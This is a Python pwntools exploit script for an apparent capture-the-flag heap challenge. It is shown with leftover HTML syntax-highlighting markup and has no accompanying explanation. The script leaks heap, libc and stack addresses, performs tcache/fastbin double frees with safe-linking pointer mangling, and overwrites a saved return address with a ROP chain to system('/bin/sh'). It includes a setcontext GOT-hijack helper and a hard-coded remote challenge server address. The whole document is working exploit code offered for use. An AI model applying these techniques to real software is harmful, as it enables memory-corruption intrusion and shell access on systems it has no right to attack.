<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">from</span> <span class="token expression">LibcSearcher import <span class="token operator">*</span></span></span>
import itertools
import ctypes

<span class="token function">context</span><span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token char">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token char">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token char">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
PORT <span class="token operator">=</span> <span class="token number">30708</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token function">ELF</span><span class="token punctuation">(</span><span class="token char">'./vuln'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

def <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>
    <span class="token keyword">return</span> <span class="token function">remote</span><span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> not is_debug <span class="token keyword">else</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> lambda x<span class="token operator">:</span> gdb<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> lambda x<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> lambda x<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> lambda x<span class="token punctuation">,</span> y<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">sendafter</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> lambda x<span class="token punctuation">,</span> y<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">sendlineafter</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> lambda x<span class="token operator">=</span>None<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x is None <span class="token keyword">else</span> p<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> lambda<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">recvline</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> lambda x<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">recvuntil</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> lambda<span class="token operator">:</span> <span class="token function">u64</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">recvuntil</span><span class="token punctuation">(</span>b<span class="token char">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ljust</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token char">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> lambda<span class="token operator">:</span> <span class="token function">u32</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">recvuntil</span><span class="token punctuation">(</span>b<span class="token char">'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


def <span class="token function">create_ucontext</span><span class="token punctuation">(</span>
    src<span class="token operator">:</span> <span class="token keyword">int</span><span class="token punctuation">,</span>
    rsp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r12<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r13<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r14<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r15<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rsi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rcx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r8<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r9<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rip<span class="token operator">=</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-></span> bytearray<span class="token operator">:</span>
    b <span class="token operator">=</span> <span class="token function">bytearray</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0xE0</span><span class="token operator">:</span><span class="token number">0xE8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span>  # fldenv ptr
    b<span class="token punctuation">[</span><span class="token number">0x1C0</span><span class="token operator">:</span><span class="token number">0x1C8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0x1F80</span><span class="token punctuation">)</span>  # ldmxcsr

    b<span class="token punctuation">[</span><span class="token number">0xA0</span><span class="token operator">:</span><span class="token number">0xA8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>rsp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token operator">:</span><span class="token number">0x88</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>rbx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x78</span><span class="token operator">:</span><span class="token number">0x80</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>rbp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x48</span><span class="token operator">:</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>r12<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token operator">:</span><span class="token number">0x58</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>r13<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x58</span><span class="token operator">:</span><span class="token number">0x60</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>r14<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token operator">:</span><span class="token number">0x68</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>r15<span class="token punctuation">)</span>

    b<span class="token punctuation">[</span><span class="token number">0xA8</span><span class="token operator">:</span><span class="token number">0xB0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>rip<span class="token punctuation">)</span>  # ret ptr
    b<span class="token punctuation">[</span><span class="token number">0x70</span><span class="token operator">:</span><span class="token number">0x78</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>rsi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x68</span><span class="token operator">:</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>rdi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x98</span><span class="token operator">:</span><span class="token number">0xA0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>rcx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token operator">:</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>r8<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token operator">:</span><span class="token number">0x38</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>r9<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x88</span><span class="token operator">:</span><span class="token number">0x90</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>rdx<span class="token punctuation">)</span>

    <span class="token keyword">return</span> b


def <span class="token function">setcontext32</span><span class="token punctuation">(</span>libc<span class="token operator">:</span> ELF<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>kwargs<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token operator">:</span>
    got <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span><span class="token function">dynamic_value_by_tag</span><span class="token punctuation">(</span><span class="token string">"DT_PLTGOT"</span><span class="token punctuation">)</span>
    plt_trampoline <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span><span class="token function">get_section_by_name</span><span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    <span class="token keyword">return</span> got<span class="token punctuation">,</span> <span class="token function">flat</span><span class="token punctuation">(</span>
        <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">p64</span><span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">p64</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"setcontext"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">p64</span><span class="token punctuation">(</span>plt_trampoline<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x40</span><span class="token punctuation">,</span>
        <span class="token function">create_ucontext</span><span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">,</span> rsp<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">e</span><span class="token expression"><span class="token punctuation">.</span>g<span class="token punctuation">.</span> dest<span class="token punctuation">,</span> payload <span class="token operator">=</span> setcontext32<span class="token punctuation">.</span><span class="token function">setcontext32</span><span class="token punctuation">(</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span>         <span class="token directive keyword">libc</span><span class="token expression"><span class="token punctuation">,</span> rip<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span></span><span class="token string">"system"</span><span class="token expression"><span class="token punctuation">]</span><span class="token punctuation">,</span> rdi<span class="token operator">=</span>libc<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>b</span><span class="token string">"/bin/sh"</span><span class="token expression"><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">__next__</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span>
#     <span class="token punctuation">)</span>

p <span class="token operator">=</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>


def <span class="token function">alloc</span><span class="token punctuation">(</span>sz<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">sla</span><span class="token punctuation">(</span>b<span class="token string">"> "</span><span class="token punctuation">,</span> b<span class="token string">"1"</span><span class="token punctuation">)</span>
  <span class="token function">sla</span><span class="token punctuation">(</span>b<span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token function">str</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">if</span> sz <span class="token operator">></span> <span class="token number">0</span><span class="token operator">:</span>
    <span class="token function">sla</span><span class="token punctuation">(</span>b<span class="token string">"> "</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
  <span class="token keyword">else</span><span class="token operator">:</span>
    <span class="token function">ru</span><span class="token punctuation">(</span>b<span class="token string">"> "</span><span class="token punctuation">)</span>

def <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">sla</span><span class="token punctuation">(</span>b<span class="token string">"> "</span><span class="token punctuation">,</span> b<span class="token string">"2"</span><span class="token punctuation">)</span>
  <span class="token function">sla</span><span class="token punctuation">(</span>b<span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token function">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

def <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">sla</span><span class="token punctuation">(</span>b<span class="token string">"> "</span><span class="token punctuation">,</span> b<span class="token string">"3"</span><span class="token punctuation">)</span>
  <span class="token function">sla</span><span class="token punctuation">(</span>b<span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token function">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token string">""</span><span class="token punctuation">)</span> # <span class="token number">0</span>
<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token string">""</span><span class="token punctuation">)</span> # <span class="token number">1</span>
<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> b<span class="token string">"fakechunk"</span><span class="token punctuation">)</span> # <span class="token number">2</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">g</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span></span></span>
<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> # free <span class="token number">2</span>
<span class="token function">show</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> # show <span class="token number">2</span>

<span class="token function">ru</span><span class="token punctuation">(</span>b<span class="token string">"data: "</span><span class="token punctuation">)</span>
heap_base <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">u64</span><span class="token punctuation">(</span><span class="token function">r</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ljust</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token char">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x5df8b4e9b000</span> <span class="token operator">-</span> <span class="token number">0x5df8b4e8a000</span><span class="token punctuation">)</span>
<span class="token function">success</span><span class="token punctuation">(</span><span class="token function">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token function">show</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> # clean up vector

<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token string">""</span><span class="token punctuation">)</span> # <span class="token number">0</span>
<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token string">""</span><span class="token punctuation">)</span> # <span class="token number">1</span>
<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> b<span class="token string">"fakechunk"</span><span class="token punctuation">)</span> # <span class="token number">2</span>
<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> b<span class="token string">"padding"</span><span class="token punctuation">)</span> # <span class="token number">3</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">g</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span></span></span>
<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> # free <span class="token number">2</span>
<span class="token function">show</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> # show <span class="token number">0</span>

<span class="token function">ru</span><span class="token punctuation">(</span>b<span class="token string">"data: "</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> <span class="token function">u64</span><span class="token punctuation">(</span><span class="token function">r</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ljust</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token char">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7b6ad2c1ace0</span> <span class="token operator">-</span> <span class="token number">0x7b6ad2a00000</span><span class="token punctuation">)</span>
<span class="token function">success</span><span class="token punctuation">(</span><span class="token function">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token function">show</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> # clean up vector

<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> b<span class="token string">"padding tcache"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token operator">*</span><span class="token number">9</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token string">""</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> b<span class="token string">"fastbin"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">double</span> <span class="token expression">free</span></span>
<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> n in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> b<span class="token string">"a"</span><span class="token punctuation">)</span>


environ <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x222200</span>
vector_target <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x14910</span>
pos <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x12950</span>
payload <span class="token operator">=</span> <span class="token punctuation">(</span>pos <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>vector_target<span class="token punctuation">)</span>

<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token function">p64</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> # A
<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"BBBBBBBB"</span><span class="token punctuation">)</span>
<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token function">p64</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> # A
<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token function">p64</span><span class="token punctuation">(</span>environ<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span> # coverage vector<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token function">show</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token function">ru</span><span class="token punctuation">(</span>b<span class="token string">"data: "</span><span class="token punctuation">)</span>
stack <span class="token operator">=</span> <span class="token function">u64</span><span class="token punctuation">(</span><span class="token function">r</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ljust</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token char">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token function">success</span><span class="token punctuation">(</span><span class="token function">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">"padding tcache2"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token operator">*</span><span class="token number">9</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token string">""</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">"fastbin"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">free</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>

<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">double</span> <span class="token expression">free</span></span>
<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>
<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>
<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> n in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">:</span>
  <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span> b<span class="token string">"a"</span><span class="token punctuation">)</span>

pos <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x12db0</span>
rbp <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffd4b8f6098</span> <span class="token operator">-</span> <span class="token number">0x7ffd4b8f5f08</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x8</span>
<span class="token function">success</span><span class="token punctuation">(</span><span class="token function">hex</span><span class="token punctuation">(</span>rbp<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token punctuation">(</span>pos <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>rbp<span class="token punctuation">)</span>

<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token function">p64</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">"BBBBBBBB"</span><span class="token punctuation">)</span>
<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token function">p64</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>

ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000baaf9</span> # xor rax<span class="token punctuation">,</span>rax<span class="token punctuation">;</span> ret
pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002a3e5</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token char">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token function">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>b<span class="token char">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> b<span class="token char">'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span>



<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">g</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span></span></span>


<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>





p<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>




<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span>